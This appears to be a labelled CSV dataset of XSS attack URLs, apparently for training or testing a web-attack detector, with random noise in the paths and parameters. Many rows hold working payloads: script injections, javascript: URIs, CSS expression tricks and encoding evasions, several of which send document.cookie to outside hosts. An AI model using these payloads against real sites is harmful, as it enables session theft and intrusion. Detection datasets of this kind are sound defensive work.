id,class,vector
8977,XSS,/eRabs.tfM/rOhkOSSG/sasAi/tkTphpd-nT/yQpotqHwL_f6DNbm/_K2linsert4tHbetweenJrBK/@PSXVQphpm4includexs/Krz/e1hbecsdihplbuhmAwbe.htm?4ceoogiqaMr9=Mnnexec&9r-9o=184&yna=onntOMdSNh71&ntmbal=650&var1UFQ=%5B%5CxC0%5D%5B%5CxBC%5Dscript%3E%5Balert+%28%275heFfemt%27%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript+++%3E&YzqandBCN0=oto1mma&otdinsieoer=ts&ottla=be%3Amimgrm%3CmOuE&Nltvnpthtzinan8=289866&tcTlqmd=tusrAnermeeant&mt=si9sSntnlas&eEriag=751&Hvaccept4jgjTVFbn=060841681&oNp5rrjbroHlii=ECklslnup&nestisw3e=eyhm%3BsesgTt%27z
8981,XSS,/1yai9y4oainf9Vseoet/tmoro/ti4arOteeItsaie/ne/tehopLLmsrtscn/nD3rKOp8TohsyoEh/kPZc3F5n3/JvJtxp_/enssorpan2t.js?oeezieelbr8eb=scriptalert%28mYy.tpie3%29script++
8983,XSS,/<script>alert('Vulnerable')</script>.jsp?
8995,XSS,/ccopync69/5b/j9pec66eu/eHDK/cl1cmddocumentXlogBQtmprUB/ndoil4E46Pl1/kxp_/ftoeelmrwo/uSwdT/oPyP5oKJJh/kWFzH-Td4stdin.cgi?etl=36015&7eotnldr6nna=O1zyjxe1&tI4fhnrcdoFmy=3566035&spnNhnold=ti9r&yanAmrqsfed=Hs6pteis&aNueale=T1rhflaracceptetu%2B&dadL7tp=2417&u3MRikn0=%3Cimg+++dynsrc+%3D++++%22++javascript%3A%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.enrosi.com%2Fcgi-bin%2Folro.cgi%27%2Bdocument.cookie%29%3B%5D%22+%3E&ew=u4h1%260WOasbodysn58lAp
8997,XSS,BwS5C=tebj35oa&enaeoucohm=6&sacald9oed0u=cava5lesr9&50WOCDM_X@c=na&aleo=stdin&hhyhm=[\xC0][\xBC]script>[alert('mbc');][\xC0][\xBC]/script >&eeges=8 f5m&srytsrsltDhoir=eNesngsher
9001,XSS,/hd4bhnwAdi2p2owT/eYuP/uhooahxst/fzU8thz3pbMB5Vawu/t2/kwOzLU-tgo99vprNDLVK.cfm?eeimnlo=cr&tr0o=%3Cdiv+style++++%3D%22+++++width%3A++++expression%28%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.it.com%2Fcgi-bin%2Ftreritse.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B+++++%22%3E
9003,XSS,/uea/h@vu3QOiUaGHEVA/tyV5ZUdraAwBbc/nNaAnI2eel/487ne%usW/wie4juyinistnnsraqiT/dU3u/46jF/pqemeoOe6ehogc/nrhoce4t/aHupt.cfm?n1r2m2.vO=14&toiXSlieorr=zu7qEW7coD&eTzltL=%26%3Cscript+++%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.nastge.com%2Fcgi-bin%2Ftantit.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E&cehlordmnep=eLzs4C-1l&rgjZeihhdnhhex=10&y46gum=rstrftrdhmgausai&2Ohsl=ai4Celbg0netcatq9oe
9020,XSS,/sDdmW./8_W_ZprFm3XMLr_/4KzcJz8wEuh6h/tLb-s1Yx-sk/paaa/dIunI9HyZA4ZJ/pFRyWZin_dgvo/s4ezNerfue/e6Lb54Gcl/h8KUsEOG82NL6VMPIt2.gif?Tbq5=08438&elattntmrsicd=%3Cimg+++++src++++%3D%22++annaraolla%3E+%22+++++onmouseover%3D+++%22+%5Balert++%28%278je%27%29%3B%5D+++++%22+%3E&lfnailtu2=03&btni7o=361563
9022,XSS,/gcW4y02Mg/gmv5c4/cthUpi4/xntsaktnupPnilhm/PI/pUGTavbscript4AlyQ/eXMbI6Ep8kF/s.r2.pl?wjta50las=a&oxEl8U4diaHg=t0UftguaRwot&a0lzsttguprco=hFxK2Rlt%40e&i89amai=3dseeeitx&jFceue=%3C%21--+--+--%3E%3Cscript+%3E%5Bwindow.open%28%27http%3A%2F%2F197.212.156.63%2Fetit.mspx%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E%3C%21--+--+--%3E&as=mEenEisi6&camh2eeOog=%7Ceae&s2uhoto=904&6Tn0rmutYNlty=14156587&eFcouwe0erbqih=tu%29t+%5Bsi+s+&ron=rckhe
9034,XSS,vooneneipsebeL=4&1osa41t=e%ushutdowni &ienetao=yTa&cTet=eexecnWlog<odrop3es p+window.open=dik&AcNYm=lawildmwtsRAeu3jri&atn=dr&&54srNiqeasrpce=d&qmbntrim5ayitt=rRhiWExV&Cwo8-yq=dT&emIQKatmpC=7814099&kHUFM0B@30z=4&zBxi=lsL&ITisFLMCX=OondaOtn9heslbr&tb=8eney
9045,XSS,Ssock_stream22q8script=rEah&udssevahnIse=lHE (fd=&ye=l&i7rnr&GVf33Cj9wVS=Nwtomriua&lre=39336&guroeyawRlAl7e=ecpe&ets5h=D@m&ocaweineii=3434
9060,XSS,/cDs0vx3VSv-8/a_BvjG1k_/eecfQVsmda/i9rh.gif?FBtZSse=%3Cimg++++dynsrc+%3D+++%22javascript%3A%5Balert+%28%27ediba%27%29%3B%5D++%22%3E
9070,XSS,/tWct8HyWbx4wuarxRtoz/mlenesl7nis5Sgo/SyCadxrrhaahis/azese/s.wryBZ1@_vmGOQQ68o/NeGun/rnnnbihdorAhloaedil0/51lEnganDtgcoses/u-2X3mrpC0DUIMFmFU3.jpg?ss5=%3Ca++href+%3D++%22+javas%26%2399%3Bript%26%2335%3B%5Bwindow.open%28%27http%3A%2F%2F219.65.97.96%2Fna.asp%27%2Bdocument.cookie%29%3B%5D%22++++%3E&lg2=3184501255&ct=55&omYJuwqPU=hhob&dOGf=7&81n7tm=93131
9083,XSS,/eiCI0kho1nnaOm0rxt/mNyttdmrrs0sne7d3ie/h5ste8ad/g_6oxU.nsf?b-Mk3Iscript=83165&oI2locationD-yT=execensbteiEjbio&2sock_streamCeL5=processing-instruction7%3E2-eghavinggtn%5BaaoM%2B&eh1ueeaOef=wone4neHBtteOl&nrubeinr1eHa=6a+RpsItS%24rhi+%26iniscript&sdookaewier=995558&catofd67i7dfmda=kgUt&yktlj=3varjr+u
9086,XSS,"rOidwusshoy5g7=3421&duidEpnae5=nnSn&tems8iese=1&ttb=8103740140&ibmr2ecbtsvct= ~form5passthruxl&access_logvhT1hU=nofrbi&aFLbinusoN=febdfihc$ho&o4vsrg1oapn=4769&scf=sHerqXezEdE0nI&qlotgrnftEyuaz=<img dynsrc    =   ""    javascript"
9087,XSS,cgiwrap/<SCRIPT>alert(document.domain)</SCRIPT>?
9088,XSS,NeeieAuepci=oIenieREKe&omonunB=499732478&Dz8E1ZY3-Pwhere=4&inabcfKtdw1=eIdumfn
9089,XSS,/srfethFeuata/iueght/gldwnID9-@/XuQVUWscriptiGX.cjtU/et73ThqYN221/rareioleIfHvcEepma/9Cyj/-qQK9VQa2@V/efrdysdresxujwrh/dW2-./tAnPeazw6echleagoir.htm?tiuady44fspt=%26%3Cscript+++%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.ieniti.com%2Fcgi-bin%2Fveilgeicnd.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E&nateh2ietrt=531457805&Tr=11299&Ltb=e5MC7NvDP
9107,XSS,/ucT/YNjs7nrmMhomeDv/qeL0a/onnseel7edhaoeeglti/ducHv0w.zO7q/Xzo9r4eImaE/1oWEMEo/rtg1n/nt_Jo@ZEp5xYnAqB/96FWF/orqeEhe/5bQ7ExCO.shtml?gaD=U2icf%26wmEog%7Eboot.ini%3F3ilc&sl6hn=2daE&em=eteglmm7oiStdsgts&av4=lt7n&m5oreo=e9WUy9Tx&5tXeotwlcesIc=tzJVn.Tw&ssceujt=62&ho=%3Cdiv+style%3D%22++binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.arde.com%2Fscript%2Fdalteh.jsp%5D%29%3B%22++++%3E
9110,XSS,/FZhomeKYunionKI-P/tivsuqTr/OzVS0RdivFCv/Sg/c1AihT2PRo7w4IPMqj/aUYaA/Isx1pqQZLbinLUpO/exoaorfnau.php4?ti9oels=pLEMg&nrjen7din7=+%3E&hbsLaanbwiitylF=oFkyHnXVbY&lsaa=oth-i&avt7stecRerdgx=%7E&replace15.ps9gclocation=+heleh&PlDE65-uyHG=133&robcarparado=6phtaccesiaosscriptiun+p&Nsacmetaxhz3d=4306084694&xheUAYdotohRe=tIfcl++%22+++++style%3Dleft%3Aexpression%28alert++%28%22++++6.e+%22%29%29+++++alt++%3D++++%22&ey40wses7tao=003&cltiiunitRlreTt=825556&bfKSabNzsam=7078878&J@ClBO=ss%3A8llTv9iTslinkd%3Ein%3C&frfE6Seieaoth=93055
9122,XSS,/iHhTlse.swf?8Syitnk=%3Cbgsound++++src+%3D++++%22+++javascript%3A%5Balert++%28%27rsee1wk%27%29%3B%5D++++%22%3E&rgazuDawurafy=8407575&uo7aoioreilo=03
9123,XSS,/eraaahuuxisisobdat/Ti/hsdt8yaq/o4H7p0vkYFOvz8AAIrSU/lk/aez7ac8eo.pl?tl6ltdeh=6328807&1a=7566635&oMgmsgenbmr=%3Cdiv++onmouseover++++%3D+%22+++%5Bwindow.open%28%27http%3A%2F%2F101.236.48.244%2Ftras.asmx%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E&cleoeltq9td=175068308&rapxeToTNn=e&mpdcsuate=+qe+93xteRe&meta9e9Gstyle=256410&rsu6h3gnocE=17019&aiceinmyyd=8hadFhloosotn&zTcat3sSwKC=802451&ge=imgtNSdweeiR&W9jV=acceptstmpusrs&icronm5di=85888&3Cml3lM_0=tstm&Ait5neal=j%3E
9133,XSS,/vop/jV4du3Q/ok/g1CSJdCsWoBexec/tSffH9gK5-LQUmHkFG-/geesta0iziwp5lowne/ibmANvvze0S1c2EBS/z3/hanaq9ztga3e.css?Szn3aan=b&5hhTrna4yyi=096&9aoO8iunb6ile=57900106&rm-B2n@uqu=i3wrupnx5bo0raowbR&s8=eEme77z&n1dm=663072&txttmYdiyanSfe=%3Clink+++rel%3D+++%22+++++stylesheet++++++%22+++++href++%3D++++%22+++javascript%3A%5Bwindow.open%28%27http%3A%2F%2F156.136.215.160%2Fenll.swf%27%2Bdocument.cookie%29%3B%5D++++++++++%22++++%3E&saEkzsowtgusu=6183566869&TWxmC=fV73Bq5Mel%40&aecep=eeng&5gBscriptrwRCh=346349&aralsds5uyro=8&dlhreEisde=5001882021
9139,XSS,/aesMl/enX@r77nLN3Lef_KDr4/eaenteDstoirusnwhpfi/8ZIDw1/rx/36G8z8S-xM/dr2ar6zhes/smewbtTiti.php3?
9146,XSS,/aeoltrds2lhTlser/ea6RleeamYs8wT/e2/ndakkntaduao/5BUidysj/rNSMO/ZmG1y-rL8U8.html?criryeaim=i1sB&tca8sAn7Iw9et=bu%5Dmggisouh&nztonetc6a=7990560&DWJWz=1&ps4wMTgZ=access_logeihou%7EiwheresdN&sr=amnc1esseeweOssu&2otioieeMtEfs=%3Cdiv+++style%3D%22++binding%3A++++url%28%5Bhttp%3A%2F%2Fwww.sita.com%2Fscript%2Fnwe.cfm%5D%29%3B+++++%22+%3E&oeana0s=891756251&es9=17&SscOIoOftsv8i=updatei%5D&oiSm3hiNhrs=66776288
9161,XSS,eeFzdeswneaorse=sexectc&tRtTEolF=fat&htaaqj3dc=otdm &72ief5e=di1rvx7ouu&l3asoev=|9n~b)&pe=96&2VREE=6859&ineacnuay=q>[&sfhInsd=0&idJ-T_Jjz3F=upositionps&er2h92=ta(&NnmochanMtmpX5DJkbetween=4&oihh75Ejithra=b9U5whmCnf9M&gZ6eot4pe=982&itrOirgb=cbttm
9166,XSS,/uoebL5leceawa7r/5Ec4X@wYRSzYJBSUk/seOA3Xwvo/znDte/57tm7t/MCl8ZJ/hsyv/oMhidb5oEp8da/jsdNaR0dtocraietwa/ERNPo9_/uIEh7gowcryl/_phcHpsock_stream.swf?2admin@yqo.acceptH=%26%7B%5Bwindow.open%28%27http%3A%2F%2F124.244.139.25%2Fenling.exe%27%2Bdocument.cookie%29%3B%5D%7D%3B&hrtuedulvrN=%27%3CR%3Dul&RGzL3bmetar=nsforowhrxri&sos6shet=918433901&tUdat=aosqTlhRtterrtm&vbscript5FvSZiGe7=1330657&aooEfssxscsa=32
9169,XSS,/ryZSHEoNMnZKN.D/auRr9_p/teou/9ein/lf9poeomreo0oth3eww/8vh9hlfp9xb/uar/eT5eMfi.tiff?Tnn8iere1E=sRk&ZakSIhfh=ndD7mBWxyLzut&8ZformDhome-O-3vF=cNCuof&ckeaeiNawfu=69232537&hode9mimbtuab=03750&ArpNGHRtRh=I4e&Ya40T=30&dtiddJ=s0Py0qYR7NJ&lydiet=d+++style%3Dleft%3Aexpression%28alert+%28ape.ikyyt%29%29
9176,XSS,/e@ExXVfJWxpGAGj_lN/mstejtslgho/iiBaeM2lEo/passwddivlinkv/nxN9E90hMJSIlfE5/d8yCsZ.BNCC37HWt2/4QV-j6cxciQ@A/deletemail/KktBCDB0aSl5Zm/g5vIHn5hFsoOAslKp/oFc/hCnDpdeial1ldo.htm?anNoaex4prnW=mei&nedia=%3Ca+++href++%3D%22+about%3A%3Cs%26%2399%3Bript%3E%5Bwindow.open%28%27http%3A%2F%2F250.198.121.50%2Fil.aspx%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E+++%22++++%3E&hrehhd6ebag=o%26-updatey3Sbha&bBeouuxhliia=eL54qox4eVmi&li0sdaeoyl=msiW%40aJ&mlh=42498&ei=orsNwp
9178,XSS,/lEaek7sittsdds/tli5sccmw/6Wesy@sHUVcTgL/1iaakyztep.js?-geLeG=418580&roeesen1Uc=ewvzNVWP7tQ&dpucuaeza=%3C%21%5BCDATA%5B%3C%21--%5D%5D+%3E%3Cscript+%3E%5Balert++%28%27rdgssl%27%29%3B%5D%2F%2F--%3E%3C%2Fscript++++%3E&DJC-=e+8gloga%29Rmailn%40uW&l09HmdwedLeOqhG=447&rvnDtlewmne=fiTbenieval0s%40fevaledeEh&pZGGid4Fq=fwnonythN&lRrglgNs=grdmsk3yhPtsubi&rjz=961521&niGgdi=i%40D._mBK..E&aaheotW9Lim=3envbscriptse%5C+&aae4eo=iuyfumTlTewindow.open0d&BCh2=p&dn=eucwhacnandelete1tn&sxtilcuMgf=N86nS
9182,XSS,"hLqyribp=T1q'?2Ho?&fnoseohksrbuv=nNCthoEo6phO&clIscaoeAi=4255953845&ra=p&z9ld=<style type="" text/javascript "" >[alert  ('zoho0It');]</style   >&ueete=609047741&_6evalz3H8Lidrgexec=3454620&euhNstrt=aOi"
9186,XSS,/vD__RiZBt8/uektqJrEoapasnroekpi/aChrren1un96yratte/hW/r8et/vQMUXnM22/hACz9FfzL8Vfb@BCvtz/4ppassthruB0wQASsYG-/6bl/Zg/gGIp45VsX/oHQzmMW4cCZtCr.tiff?AeR6u6=ooVea&f1rrnh2rsctmIr=an&hsiooifttcIet4e=tE-ri+lo8rhBt%3Blln&ov1plshOoq=3&odne=p1Cdc3_g%40&ant=m%40h8t%5D&@cWm6w0N-S=%3Cstyle++%3E%3C%21--%3C%2Fstyle%3E%3Cscript+%3E%5Balert++++%28%27r2he%27%29%3B%5D%2F%2F--%3E%3C%2Fscript+%3E&ofnesoqoen4r=9ud6&mZrt6on=%3CgttWssoconnect&t9e6lbdat=adpq&attaeIdcirse=0138554732&beftKes0snhtwc1=04541567
9189,XSS,/eQ2o.5iesyjNDZpc8Zuj/o9lImfngTPMYKxgs7_J/bA3utnhreSNWobfdNur9/a.QYsVc_3W/dvezO8VG56ObM/xl/K931c1.htm?zwE_8MqRE4=ptga&dIshiw=15150331&Pwbm=57&xImetc-updateHYk7usr5=zmaiodE&hoestsha=2ztae5TprCEc8r&Ed0tl=tGu__H&6o=iam7JDHnetcfe%3A+IiframeHm&lmate2Deqeehae=983&Hwws4N6hra3oye=%3Cbgsound+++++src++%3D+%22++++javascript%3A+%5Bwindow.open%28%27http%3A%2F%2F165.112.244.84%2Finar.php4%27%2Bdocument.cookie%29%3B%5D++++++++%22+%3E&tihD1eE=zphmnts&nApaEd=5lerjooEnnitn&9iAa6Tosos=toee&edkeenovminta=fseriuadhehsrcuh
9205,XSS,/eatt/dFfdHzhRBCwkxAiWc1/hredeeeaeGenEtmce/OywgetB@tLb.Ytu.jpeg?t1o=passthru&NctmpO=%3Cimg++src%3D++++%22+javascript%3A+%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.rond.com%2Fcgi-bin%2Ftrmetais.cgi%27%2Bdocument.cookie%29%3B%5D+++%22%3E&t0rvyiupINi=ge
9208,XSS,/8Mx7J0Hsulx4ECn/l_w5M05ab/vwceixdsituiy4/2Ruae0cd4dA.dll?I-inURwhereo5I=385280&otbrsk=%3Cinput+++type++%3D++%22++image%22++++dynsrc%3D+%22javascript%3A++++%5Balert++%28%27srVihe%27%29%3B%5D++++%22++++%3E
9212,XSS,/u0QBoNEBI_/ZUOhT7d/fh2jh8TrUa/n2m/3haLoev1n/u6d.ChIzGbVaEbzF3NUK/ueopiDht/E52/4dBJD3v6/fscriptVrJPGSB_shutdownp.cfm?ntmow=%3Cimg++++src%3D+%22+++++itnsatelin++++%3E+++++%22+++++onmouseover++%3D++++%22++%5Bwindow.open%28%27http%3A%2F%2F251.37.249.187%2Fge.mdb%27%2Bdocument.cookie%29%3B%5D%22++%3E&tsr44in=hao&2gstonbsTbeEeu=8hdmeo+benn&Fy7GiTzhwgety.i=26&he0fniery=+bRpshaoenai%7Es
9216,XSS,/rH/9HIb4ti4wrQ/oo1L0v4@7.asp?jef4b=09V-0&syejeyV=eNi0qev3C&oc=d+t&eqhmUnprEpefraH=04210&txtloora=dsblo
9219,XSS,/Lsamshutdownvw/0XcfS/eh2RTS3CB5FNk/cKZVT/atnsLcJkIbtMa.E5ytk/evsut/swRaAZsMcVqZ@ohgkVP/aasdfneows/dmaycri/ouctLAat8/461sAaxsT/9Tcso6RfR.Kr.shtml?etoig=51&rli=nF6nt8+&in=%3C%21%5BCDATA%5B%3C%21--%5D%5D++++%3E%3Cscript+%3E%5Bwindow.open%28%27http%3A%2F%2F16.82.166.193%2Fla.cfm%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript+++%3E&E6a44=scjyaM+%25t&yNsuYakb=nxml8%2F0der
9228,XSS,/dl2RjNq/0gVh54MxcPBdLQ2dNor1/2LYrMkfwhereS/te/7hsitc9ohaehnTen/rSxmLc/ul2seOsusktts0kec/lrepnnrac8nfwsmef/dfzGTWf.php4?ty=16038629&s9pze=e4hkenmqynwpSrgo5n&cS5t=tDuFPNxV8ug&mSandCmynBwCJ=7ho&Y5Pbgsound=7979078&LstylelCgu=o&t7rgotnffT5aat=e%3FyRds+replace5omfsodedl&xwvdi=dsa&Ert14eraeEas=xgi&arfhianIt=eaxot&aradhfgcrd=a+h%3Bs&nnesEU=gvwDehece7
9249,XSS,"shbwroegslj=349386&zere=643937835&tae4nlnjrzbhEe=<link   rel    =  ""  stylesheet    "" href  =""    javascript"
9254,XSS,/vIKps/tyMrsdusaevieio/iG1WUWz7Li/oK_Xi3_/ea9f7csaafd/drVBt46C7-62jj/e4oFjgfM.mdb?hriexsntxfm=8s&apoeaImTolrEAi=038686&o0lokdfdemzes=928&efyA8cz2=cete&cfrereso=imeb66tsax%7Cnrs6la2&eeltyaTaydm=%5C%3Ftn8&ilon1ie0isoe5=%27cda%3DRew%2B5%29m%26c&Tsure=o0hetns&5taeaelsPE=nH%405xMfdxZD3&nodeT=ryShe&zInBWr=le0aadminb9ls&jsbb=i.w7RFg3z&nedrpr5iAni=394&PnTTZXLeO=%3Cbgsound++src%3D+++%22+javascript%3A%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.tosi.com%2Fcgi-bin%2Ftina.cgi%27%2Bdocument.cookie%29%3B%5D+%22++%3E&mui0se=2565034
9263,XSS,/a6sxBSKGH2Sfdc/flibacceptfprRH/goHPwindow.openR_EUc/s1A7/oM.R478/tcEr/Z5Ydrr/RwneebpMetTaEiz/gCZr1oG5tO3R8CsP9mVK/qasihnPseaetEtnnA/ieetsa.asmx?pefcrO=63929&phnEaNoehioihh=e&vAOec5=9&cue=%3Cimg+src++%3D++%22++++mocha%3A%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.annaonto.com%2Fcgi-bin%2Fie.cgi%27%2Bdocument.cookie%29%3B%5D%22++++%3E
9264,XSS,/omE.wpv1uMM/orExi.ymTj/fSrcpzrC/hdrontBRke/Rhyyfenhoofbeo/st0lhMtori/stn/uidMm2u2io/iionrooctinem/rjnlottntxs/eDennblvne3cstty/romilzua2tut1fe.tiff?shieraiOnMno=%298execailne&h9tcthotesio8xn=6841321&aiaera5lteaH2=f&tr=nt3hTlchryaroeAh1&aN6NG-=lneTtri&eaaejeoeo=+%29linkW&.nqpOv4=08&ttudeQn=%3Cbgsound+++src+++%3D++%22+++++javascript%3A+%5Balert+%28%27se%27%29%3B%5D+++++%22++++%3E&dem=llndo&eevrrWtt3=eufec6ao&4jopdoasrlnmia=%3Eh%400ir3+p%27citew
9267,XSS,/cC.html?uldurc6hLasxu=713160&zhsOtclo=%26%7B%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.nselst.com%2Fcgi-bin%2Fll.cgi%27%2Bdocument.cookie%29%3B%5D%7D%3B&in1bfX=8905656&93sXOwp-=%3D7processing-instructionir%5DFwvbscriptweevalsY-o&dqtodl=6&ntA%ul=438626&yQkqfVE=d1itlet&alnhedhre6j=d5%3F&sadei=5828&xpoctto5ay=eallg&aTEat=6
9269,XSS,/dDrejumilah/W63DbiPJK-u4.tiff?
9273,XSS,"oataostaHytudlm=/6zqhah%eoocftprae[&neklGfeeu3lh22=6oplibidwircpetmpb?re$ deval%u&onnogsaisxsb8=ed9Su ""       style=left:expression(alert(""  nt.pa4eye ""))   alt    =    ""&5dpnnrq7=6031&jXh=tGl5&aelDyBs=4nvh"
9284,XSS,/ea/eue01xl/vthoyom/eQK3-cvOGDtn@/uydvIMd1xOc6V1vlK.swf?NimgTrNH=ii&asbdriesrh=373&emesce7hlezc=tabqeiio+eddbetweenhhd%3F&i6oeaOEieru=229&uEorr3cRr=95&ancnNe4oloehiie=httptkv&eLmD=iDyxy60G5g&lncr0ndtojmie=%3Ca+++++href+++%3D++%22++about%3A%3Cs%26%2399%3Bript%3E%5Bwindow.open%28%27http%3A%2F%2F19.195.102.173%2Fetve.jsp%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++%3E+++++%22++%3E&mo5ieiatE=dn3nhhEsystemhomes8oAn&ei=Hl%7E
9299,XSS,cgiwrap/<SCRIPT>alert(document.domain)</SCRIPT>?
9334,XSS,itrwicmiuw=[\xC0][\xBC]script>[document.location.replace  ('http://www.anlitela.com/cgi-bin/tetreschch.cgi'+document.cookie);][\xC0][\xBC]/script >
9340,XSS,/c3n3J3v8GOIWl2y/yPkaynAaoautol6/l_GKO-k/smmensiaOahmfoc/@o/j0Lecge2e/aIDUrvSeWWO/g3Uc0/4sTestt8nntLnja3Sto/UW/aesekAaE/fM6jRGg1aWrOg.FCWs.shtml?tIqOroeot2b4s=%3Cdiv+style+%3D++%22+++++behaviour%3A+++++url%28%5Bhttp%3A%2F%2Fwww.la.com%2Fscript%2Fi9eS2uls.cfm%5D%29%3B++++%22++++%3E
9348,XSS,"/""><img"
9350,XSS,xysermfica=mSey&roguiS=7343&eds=mdRaestylescctaejuenaxhaving&aruas7mteSizr6o=s&1rdksi=8003060&ncrh4nxoWvx=edocument
9354,XSS,/eela1rbr7tnhvaiUSleN/ooiesd5e5aemsilo/e6.1RMIuQ@GT/rDudnNe/n2.4oGaRMfzQl5LP/dch.js?IZVufq=3duwtugyrqEoo&a4gueenree8aD=%3Cdiv+++++style++%3D%22++behaviour%3A++++url%28%5Bhttp%3A%2F%2Fwww.iciten.com%2Fscript%2FsifctlrAcs.asmx%5D%29%3B+%22++%3E&gp_aww=0&olhUte80iTet=evaly%3Eai%26ipositioninclude4nl&ube=r&q0nSemp4a8l=2946632&e9owsdeimc=325868&ahjwf=srebc&nettleus=5&mdp=httpphp8aijaSeE%27bvo&HRaEvf=azz4a&G@rH3=d8+%25tgriiuinputntn&f3iInsattltH=jw9i&Zu.GSV64=24
9358,XSS,/L9qY1-RR.-z/se4l4EU79AJIG/rrccaruih9uOshrilhir.htm?Ehnoasupc0apms=kln0acmgNg%3Ci18uOn%25me&qrqd=hNXgr0H_q&UxPSLZW_FIk=F%40&o5Edwxuhdart=89&sh5gveetirrdo=%3Ciframe++src+%3D+%22++vbscript%3A%5Balert++%28%27Xm%27%29%3B%5D+++++%22++%3E&tmwaie=gbfoUn
9361,XSS,/fltihfj6i/n2rS5ner/se/o51ta0qxsE8OtBjH/andMmochaVbKry/rpbba6/6rHsAnoUeier/ehestePlsonrnr/im2rTgtDTSS7.El.6/boaK__/ecx-DZy5WLv.bin?odra=66nnfonindqiNt&ieohtr=NNoeSs2bthernu&i6r=scsB7arsbi&meaqwlN5=353&eitdnndmH6olp=%3Cimg+++dynsrc++++%3D+++%22javascript%3A++%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.maanng.com%2Fcgi-bin%2Fns.cgi%27%2Bdocument.cookie%29%3B%5D+%22++++%3E
9362,XSS,/oOgcbNnC8/tFPmtE1Wfox1VRpyxldx/Vo8r4wabaois8ent1l93/XndFd6l-aSR/du/ilBPT_.@.jpg?wrct21Lshqstuo=82362034&inrdwlok0rva=h%3FdoUyvdnctib&rifgWOr=%3Cimg+++src++%3D+++%22+livescript%3A%5Bwindow.open%28%27http%3A%2F%2F116.19.183.36%2Foltall.nsf%27%2Bdocument.cookie%29%3B%5D++++++%22+%3E&n0tn=jx9&fet95cTn=eHsdtzs&tN7armeam=69&w0oa3qhidt=9co&nittAernhood2i=1esI1me8do7zduSg&@rK0link=wHwFitCeHtqr
9363,XSS,/bijryLny13/eWiFMHrx1cZyWBu1W/sWJfvo/edaEtthu4elo8b/eH1NcVEXBEqv/RDFu4y5.JTN3av/3i.QgV_aRLX/WxTnxolun/lw6UzptsMi6IiGW2/ene/rhuE1ee.css?WJV6n9_nIy=35136&koaehe8mhe=tnftuaeAacuCoxedil&citdntbsra5g=kU0J&eAi9eDn=88179186&ehOsI2r6=%290Dbnt%3E&etaRsiziI=%26%7B%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.ve.com%2Fcgi-bin%2Ftrngri.cgi%27%2Bdocument.cookie%29%3B%5D%7D%3B&cousetsem7kd=97759
9368,XSS,"k4dg=05463&wpeeya0=hNGkWanHoCCh&neseOi5enmnorp=<bgsound    src   =    ""javascript"
9369,XSS,/jh0attp1r6welmfnQS/tKZRO_HTPaLo/a13aK@IBAW9_3do@sAK/t70Ks-KKIGBSX1.xOZ/jAENB2AvL0m3p/cMdeSNlSRLh/09Ub-i/15XG70LPrMQ9q9-wl/lue/jvOS@P5oS4R92hdi@a8A.asmx?n1nhuta=DB&stnsEthlxh=92201451&huvnbmvengs8W=17508190&cN3=%40aicCuqoae&hxkoRnti3hniy=Mixd&VcxtermVw1idwhereJR=oeihnqMtw&mfsecgncaehgto=%3Cimg+src+++%3D%22+++++livescript%3A%5Balert++++%28%27ns%27%29%3B%5D++++%22++++%3E&fU06TyOyt=ey4lhteieut+b6t&vn8roasdx=747&IcCNJ=9J
